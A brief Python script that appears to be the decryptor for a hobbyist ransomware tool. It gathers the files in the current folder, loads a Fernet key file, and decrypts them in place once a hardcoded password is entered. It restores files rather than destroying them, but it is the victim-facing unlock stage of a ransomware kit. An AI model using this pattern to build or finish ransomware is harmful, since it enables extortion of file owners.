import os
from cryptography.fernet import Fernet
#making a decryption for ransomware

files = []

for file in os.listdir():
	if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

with open("thekey.key", "rb") as key:
	secretkey = key.read()


secretphrase = "briansebastian"
userphrase = input("Please enter the correct password to decrypt your files:	")
if userphrase == secretphrase:
	for file in files:
		with open(file, "rb") as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, "wb") as thefile:
			thefile.write(contents_decrypted)
	print("Congrats! Your files are now decrypted.")

else:
	print("Incorrect password. Try again.")





